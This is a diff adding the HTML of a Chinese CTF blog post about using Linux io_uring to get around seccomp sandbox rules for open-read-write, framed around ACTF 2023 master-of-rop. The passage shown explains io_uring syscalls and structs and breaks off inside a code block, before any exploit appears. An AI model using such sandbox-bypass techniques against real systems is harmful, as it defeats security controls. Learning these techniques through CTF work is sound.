@@ -1,0 +1,1495 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Io_uring - J4f&#39;s blog</title><meta name="author" content="J4f">
+<meta name="description" content="突破沙箱规则，实现orw
+">
+  <meta itemprop="name" content="io_uring">
+  <meta itemprop="description" content="突破沙箱规则，实现orw">
+  <meta itemprop="datePublished" content="2025-08-23T13:56:19+08:00">
+  <meta itemprop="dateModified" content="2025-08-23T14:03:41+08:00">
+  <meta itemprop="wordCount" content="2778">
+  <meta itemprop="keywords" content="Pwn"><meta property="og:url" content="http://localhost:1313/posts/io_uring/">
+  <meta property="og:site_name" content="J4f&#39;s blog">
+  <meta property="og:title" content="io_uring">
+  <meta property="og:description" content="突破沙箱规则，实现orw">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-08-23T13:56:19+08:00">
+    <meta property="article:modified_time" content="2025-08-23T14:03:41+08:00">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="io_uring">
+  <meta name="twitter:description" content="突破沙箱规则，实现orw">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="/1.jpg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/io_uring/" title="io_uring - J4f&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/phppwn_re_struct/" title="phppwn逆向" /><link rel="next" type="text/html" href="http://localhost:1313/posts/cpp_pwn/" title="C&#43;&#43;pwn之异常处理" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/io_uring/index.md" title="io_uring - J4f's blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "io_uring",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/io_uring\/"
+    },"genre": "posts","wordcount":  2778 ,
+    "url": "http:\/\/localhost:1313\/posts\/io_uring\/","datePublished": "2025-08-23T13:56:19+08:00","dateModified": "2025-08-23T14:03:41+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "J4f"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents ..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="J4f&#39;s blog"><span class="typeit"><template>J4f&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents ..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Io_uring</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img class="avatar" src='/1.jpg' alt="J4f" height="16" width="16">&nbsp;J4f</span></span><span class="post-included-in">&nbsp;included in <a href="/categories/pwn/" class="post-category" title="Category - Pwn"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Pwn</a></span></div><div class="post-meta-line"><span title="published on 2025-08-23 13:56:19"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-23">2025-08-23</time></span>&nbsp;<span title="Updated on 2025-08-23 14:03:41"><i class="fa-regular fa-calendar-check fa-fw me-1" aria-hidden="true"></i><time datetime="2025-08-23">2025-08-23</time></span>&nbsp;<span title="2778 words"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>About 2800 words</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>14 minutes</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#基础知识">基础知识</a>
+      <ul>
+        <li><a href="#io_uring_setup"><code>io_uring_setup</code></a></li>
+        <li><a href="#io_uring_enter"><code>io_uring_enter</code></a></li>
+        <li><a href="#模板">模板</a></li>
+        <li><a href="#liburing">liburing</a></li>
+      </ul>
+    </li>
+    <li><a href="#actf-2023-master-of-rop">ACTF 2023 master-of-rop</a>
+      <ul>
+        <li><a href="#确定内核版本">确定内核版本</a></li>
+        <li><a href="#寻找代替系统调用">寻找代替系统调用</a></li>
+        <li><a href="#实现">实现</a></li>
+      </ul>
+    </li>
+    <li><a href="#参考文章">参考文章</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>突破沙箱规则，实现orw</p>
+<h2 class="heading-element" id="基础知识"><span>基础知识</span>
+  <a href="#%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><code>io_uring</code>涉及三个系统调用</p>
+<ul>
+<li><code>io_uring_setup(2)</code></li>
+<li><code>io_uring_register(2)</code></li>
+<li><code>io_uring_enter(2)</code></li>
+</ul>
+<h3 class="heading-element" id="io_uring_setup"><span><code>io_uring_setup</code></span>
+  <a href="#io_uring_setup" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>用于初始化执行异步IO的上下文</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">       <span class="cp">#include</span> <span class="cpf">&lt;liburing.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="kt">int</span> <span class="nf">io_uring_setup</span><span class="p">(</span><span class="n">u32</span> <span class="n">entries</span><span class="p">,</span> <span class="k">struct</span> <span class="n">io_uring_params</span> <span class="o">*</span><span class="n">p</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这个系统调用</p>
+<ul>
+<li><strong>创建一个 SQ 和一个 CQ</strong></li>
+<li>返回一个文件描述符，随后作为其他相关系统调用的参数</li>
+</ul>
+<p>SQ 和 CQ 在应用和内核之间共享（需要用到mmap，还需要mmap SQEs），避免了在初始化和完成 I/O 时（initiating and completing I/O）拷贝数据。</p>
+<p>参数：</p>
+<ul>
+<li>
+<p><code>entries</code>参数：
+设置SQ和CQ的初始容量<strong>至少</strong>为<code>entries</code>（至少是因为<code>entries</code>必须是2的幂次方（如32、64、512等），如果不是内核也会<strong>自动对齐到最近的更大幂次值</strong>（如传入100会被调整为128））</p>
+</li>
+<li>
+<p><code>io_uring_params</code>结构体：</p>
+<p><strong>一般都是把<code>io_uring_params</code>初始化然后清零，再传入<code>io_uring_setup</code>，内核再将一些返回的信息写入这个结构体</strong></p>
+</li>
+</ul>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">io_uring_params</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">sq_entries</span><span class="p">;</span>          <span class="c1">// 实际提交队列（SQ）大小
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">cq_entries</span><span class="p">;</span>          <span class="c1">// 实际完成队列（CQ）大小
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">flags</span><span class="p">;</span>               <span class="c1">// 创建 io_uring 的标志（由用户指定），为0采用中断驱动模式
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">sq_thread_cpu</span><span class="p">;</span>       <span class="c1">// SQ polling 线程绑定的 CPU
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">sq_thread_idle</span><span class="p">;</span>      <span class="c1">// SQ polling 线程空闲休眠时间
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">features</span><span class="p">;</span>            <span class="c1">// 内核支持的特性标志
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">wq_fd</span><span class="p">;</span>               <span class="c1">// 共享 workqueue 的 io_uring 实例 fd
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">resv</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>             <span class="c1">// 保留字段,必须为0
+</span></span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_sqring_offsets</span> <span class="n">sq_off</span><span class="p">;</span>   <span class="c1">// SQ 环形队列的偏移信息
+</span></span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">io_cqring_offsets</span> <span class="n">cq_off</span><span class="p">;</span>   <span class="c1">// CQ 环形队列的偏移信息
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">io_sqring_offsets</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">head</span><span class="p">;</span>        <span class="c1">// SQ 的 head 指针（用户态消费，内核读取）
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">tail</span><span class="p">;</span>        <span class="c1">// SQ 的 tail 指针（用户态生产，内核读取）
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">ring_mask</span><span class="p">;</span>   <span class="c1">// 环大小掩码，用于索引取模
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">ring_entries</span><span class="p">;</span><span class="c1">// SQ ring 的 entry 总数
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">flags</span><span class="p">;</span>       <span class="c1">// SQ 状态标志位
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">dropped</span><span class="p">;</span>     <span class="c1">// 内核丢弃的 SQE 数量
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">array</span><span class="p">;</span>       <span class="c1">// SQE 索引数组（存放 SQE 的顺序）
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">resv1</span><span class="p">;</span>       <span class="c1">// 保留字段
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u64</span> <span class="n">user_addr</span><span class="p">;</span>   <span class="c1">// 用户自定义地址（较新内核引入）
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">struct</span> <span class="n">io_cqring_offsets</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">head</span><span class="p">;</span>        <span class="c1">// CQ 的 head 指针（用户态消费）
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">tail</span><span class="p">;</span>        <span class="c1">// CQ 的 tail 指针（内核生产）
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">ring_mask</span><span class="p">;</span>   <span class="c1">// 环大小掩码，用于索引取模
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">ring_entries</span><span class="p">;</span><span class="c1">// CQ ring 的 entry 总数
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">overflow</span><span class="p">;</span>    <span class="c1">// CQ 溢出计数
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">cqes</span><span class="p">;</span>        <span class="c1">// CQE 数组起始偏移
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">flags</span><span class="p">;</span>       <span class="c1">// CQ 状态标志
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u32</span> <span class="n">resv1</span><span class="p">;</span>       <span class="c1">// 保留
+</span></span></span><span class="line"><span class="cl">    <span class="n">__u64</span> <span class="n">user_addr</span><span class="p">;</span>   <span class="c1">// 用户自定义地址
+</span></span></span><span class="line"><span class="cl"><span class="p">};</span></span></span></code></pre></td></tr></table></div><div class="code-expand-btn" aria-label="Expand or collapse code block" role="button"><i class="fa-solid fa-angles-down" aria-hidden="true"></i></div>
+</div>
+</div><h3 class="heading-element" id="io_uring_enter"><span><code>io_uring_enter</code></span>
+  <a href="#io_uring_enter" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="1" style="--fi-max-shown-lines:10;--fi-line-digit:1;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl">       <span class="cp">#include</span> <span class="cpf">&lt;liburing.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">       <span class="kt">int</span> <span class="nf">io_uring_enter</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">to_submit</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                          <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">min_complete</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                          <span class="kt">sigset_t</span> <span class="o">*</span><span class="n">sig</span><span class="p">);</span></span></span></code></pre></td></tr></table></div>
+</div>
+</div><p>这个系统调用用于初始化和完成（initiate and complete）I/O，使用共享的 SQ 和 CQ。 单次调用同时执行：</p>
+<ul>
+<li>提交新的 I/O 请求</li>
+<li>等待 I/O 完成</li>
+</ul>
+<p>参数：</p>
+<ul>
+<li><code>fd</code> 是 <code>io_uring_setup()</code> 返回的文件描述符</li>
+<li><code>to_submit</code> 告知内核当前有多少个 SQE已准备就绪，可以立即被消费和提交</li>
+<li><code>min_complete</code>默认模式，会等待这个数量的 I/O 事件完成再返回</li>
+<li><code>flags</code>用于控制内核行为</li>
+<li><code>sig</code>设置进程的信号屏蔽状态，如：是否会被<code>Ctrl+c</code>终止。进行orw的话，置0就行</li>
+</ul>
+<p><strong>io_uring_sqe</strong></p>
+<p>用于传递IO操作的具体信息</p>
+<p><code>opcode</code>：决定执行什么操作，其中包含一些文件IO操作(如：一些等价于open、write的操作)、进程管理操作等</p>
+<div class="code-block highlight" data-mode="classic" data-copyable="true"><div class="chroma">
+<div class="code-header language-c"><span class="code-title"><i class="arrow fa-solid fa-chevron-down fa-fw" aria-hidden="true"></i></span><span class="ellipses-btn" aria-label="Show more options" role="button"><i class="fa-solid fa-ellipsis-h fa-fw" aria-hidden="true"></i></span><span class="line-nos-btn" aria-label="Toggle line numbers" role="button" title="Toggle line numbers"><i class="fa-solid fa-list-ol fa-fw" aria-hidden="true"></i></span><span class="line-wrap-btn" aria-label="Toggle code wrap" role="button" title="Toggle code wrap"><i class="fa-solid fa-right-left fa-fw" aria-hidden="true"></i></span><span class="copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-fw" aria-hidden="true"></i></span></div><div class="code-wrapper" data-max="10" data-line-digit="2" style="--fi-max-shown-lines:10;--fi-line-digit:2;--fi-line-start:1;"><table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
